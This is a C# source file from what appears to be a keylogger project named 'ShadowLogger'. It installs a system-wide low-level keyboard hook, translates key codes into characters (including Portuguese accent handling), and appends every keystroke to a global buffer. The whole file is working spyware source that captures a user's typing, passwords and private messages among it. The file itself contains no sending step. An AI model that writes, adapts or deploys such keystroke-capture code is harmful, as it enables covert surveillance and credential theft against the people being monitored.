using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ShadowLogger.bin.Hooks
{
    internal class KeyboardHook
    {
        #region " P/Invoke Declarations "

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int hookType, KeyboardHookDelegate lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr Hook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr UnhookWindowsHookEx(IntPtr Hook);

        #endregion

        private enum KeyboardMessages
        {
            WM_KEYUP = 0x101,
            WM_KEYDOWN = 0x100,
            WM_SYSKEYDOWN = 0x104,
            WM_SYSKEYUP = 0x105
        }

        private struct KBDLLHOOKSTRUCT
        {
            //KeyCode (Of interest to us)
            internal int vkCode;
            //ScanCode
            internal int scanCode;
            internal int flags;
            internal int time;
            internal int dwExtraInfo;
        }

        private delegate IntPtr KeyboardHookDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        private IntPtr _kbHandle;
        private KeyboardHookDelegate _khd;

        private string _modifierString = string.Empty;

        private string VogalModifier(string modifier, string vogal)
        {
            _modifierString = string.Empty;

            switch (modifier)
            {
                case "´":
                    switch (vogal)
                    {
                        case "A":
                            return "Á";
                        case "E":
                            return "É";
                        case "I":
                            return "Í";
                        case "O":
                            return "Ó";
                        case "U":
                            return "Ú";
                    }

                    break;
                case "`":
                    switch (vogal)
                    {
                        case "A":
                            return "À";
                        case "E":
                            return "È";
                        case "I":
                            return "Ì";
                        case "O":
                            return "Ò";
                        case "U":
                            return "Ù";
                    }

                    break;
                case "~":
                    switch (vogal)
                    {
                        case "A":
                            return "Ã";
                        case "E":
                            return "~E";
                        case "I":
                            return "~I";
                        case "O":
                            return "Õ";
                        case "U":
                            return "~U";
                    }

                    break;
                case "^":
                    switch (vogal)
                    {
                        case "A":
                            return "Â";
                        case "E":
                            return "Ê";
                        case "I":
                            return "Î";
                        case "O":
                            return "Ô";
                        case "U":
                            return "Û";
                    }

                    break;
            }

            return null;

        }

        internal void CreateHook()
        {
            _khd = new KeyboardHookDelegate(KeyboardHookCallback);
            GC.KeepAlive(_khd);

            _kbHandle = SetWindowsHookEx(13, _khd, Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]), 0);

            GlobalVariables.GlobalVariables.KHookStatus = (_kbHandle != IntPtr.Zero);
        }

        internal void DisposeHook()
        {
            UnhookWindowsHookEx(_kbHandle);
            GlobalVariables.GlobalVariables.KHookStatus = false;
        }

        private IntPtr KeyboardHookCallback(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            if (nCode == 0)
            {
                switch ((KeyboardMessages)wParam)
                {
                    case KeyboardMessages.WM_KEYDOWN:
                    case KeyboardMessages.WM_SYSKEYDOWN:
                        KeyDown(GetKey((Keys)lParam.vkCode));
                        break;
                }
            }

            GC.KeepAlive(_khd);
            return CallNextHookEx(_kbHandle, nCode, wParam, ref lParam);
        }

        private string GetKey(Keys key)
        {
            bool upperCase = false;
            bool shiftEnabled = false;

            upperCase = Control.IsKeyLocked(Keys.CapsLock);

            shiftEnabled = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;

            if (upperCase)
            {
                upperCase = !shiftEnabled;
            }
            else
            {
                upperCase = shiftEnabled;
            }

            switch ((int)key)
            {

                //Backspace and Tab key
                case 8:
                case 9:

                    return "<" + key + ">";
                //Return key
                case 13:

                    return Environment.NewLine;
                //Escape key
                case 27:

                    return "<" + key + ">";
                //Spacebar key
                case 32:

                    return " ";
                //0-9
                case 48:
                case 49:
                case 50:
                case 51:
                case 52:
                case 53:
                case 54:
                case 55:
                case 56:
                case 57:
                    if (shiftEnabled)
                    {
                        switch (key.ToString())
                        {
                            case "D1":
                                return "!";
                            case "D2":
                                return "\"";
                            case "D3":
                                return "#";
                            case "D4":
                                return "$";
                            case "D5":
                                return "%";
                            case "D6":
                                return "&";
                            case "D7":
                                return "/";
                            case "D8":
                                return "(";
                            case "D9":
                                return ")";
                            case "D0":
                                return "=";
                        }
                    }
                    else
                    {
                        return key.ToString().Replace("D", string.Empty);
                    }

                    break;

                    //vogals. checking for modifiers.
                case 65:
                case 69:
                case 73:
                case 79:
                case 85:
                    if (_modifierString == string.Empty)
                    {
                        if (upperCase)
                        {
                            return key.ToString();
                        }
                        else
                        {
                            return key.ToString().ToLower();
                        }
                    }
                    else
                    {
                        if (upperCase)
                        {
                            return VogalModifier(_modifierString, key.ToString()).ToUpper();
                        }
                        else
                        {
                            return VogalModifier(_modifierString, key.ToString());
                        }
                    }

                //A-Z
                case 66: // TODO: to 90
                case 67:
                case 68:
                case 70:
                case 71:
                case 72:
                case 74:
                case 75:
                case 76:
                case 77:
                case 78:
                case 80:
                case 81:
                case 82:
                case 83:
                case 84:
                case 86:
                case 87:
                case 88:
                case 89:
                case 90: 
                    if (upperCase)
                    {
                        return key.ToString();
                    }
                    else
                    {
                        return key.ToString().ToLower();
                    }

                //Numpad 0-9
                case 96:
                case 97:
                case 98:
                case 99:
                case 100:
                case 101:
                case 102:
                case 103:
                case 104:
                case 105:

                    return key.ToString().Replace("NumPad", string.Empty);
                //Numpad Math
                case 106:
                    return "*";
                case 107:
                    return "+";
                case 109:
                    return "-";
                case 110:
                    return ".";
                case 111:

                    return "/";
                //Math keys
                case 187:
                    if (shiftEnabled)
                    {
                        return "*";
                    }
                    else
                    {
                        return "+";
                    }
                case 188:
                    if (shiftEnabled)
                    {
                        return ";";
                    }
                    else
                    {
                        return ",";
                    }
                case 189:
                    if (shiftEnabled)
                    {
                        return "_";
                    }
                    else
                    {
                        return "-";
                    }

                case 190:
                    if (shiftEnabled)
                    {
                        return ":";
                    }
                    else
                    {
                        return ".";
                    }

                //Miscellaneous
                case 186:
                    //´
                    if (_modifierString == string.Empty)
                    {
                        if (shiftEnabled)
                        {
                            _modifierString = "`";
                        }
                        else
                        {
                            _modifierString = "´";
                        }
                        return null;
                    }
                    else
                    {
                        string modifierCopy = _modifierString;
                        _modifierString = string.Empty;

                        if (shiftEnabled)
                        {
                            return modifierCopy + "`";
                        }
                        else
                        {
                            return modifierCopy + "´";
                        }
                    }
                case 191:
                    //~
                    if (_modifierString == string.Empty)
                    {
                        if (shiftEnabled)
                        {
                            _modifierString = "^";
                        }
                        else
                        {
                            _modifierString = "~";
                        }
                        return null;
                    }
                    else
                    {
                        string modifierCopy = _modifierString;
                        _modifierString = string.Empty;

                        if (shiftEnabled)
                        {
                            return modifierCopy + "^";
                        }
                        else
                        {
                            return modifierCopy + "~";
                        }
                    }
                case 192:
                    //ç
                    if (upperCase)
                    {
                        return "Ç";
                    }
                    else
                    {
                        return "ç";
                    }
                case 219:
                    if (shiftEnabled)
                    {
                        return "?";
                    }
                    else
                    {
                        return "'";
                    }
                case 220:
                    if (shiftEnabled)
                    {
                        return "|";
                    }
                    else
                    {
                        return "\\";
                    }
                case 221:
                    if (shiftEnabled)
                    {
                        return "»";
                    }
                    else
                    {
                        return "«";
                    }
                case 222:
                    if (shiftEnabled)
                    {
                        return "ª";
                    }
                    else
                    {
                        return "º";
                    }
            }
            return null;
        }

        private void KeyDown(string key)
        {
            //_modifierString returned here because i'm too fucking lazy to return it in every fucking return statement on GetKey() in the case none of the modifier keys are pressed.
            if (key == null) return;

            GlobalVariables.GlobalVariables.MainData.Append(_modifierString + key);
            _modifierString = string.Empty;
        }
    }
}
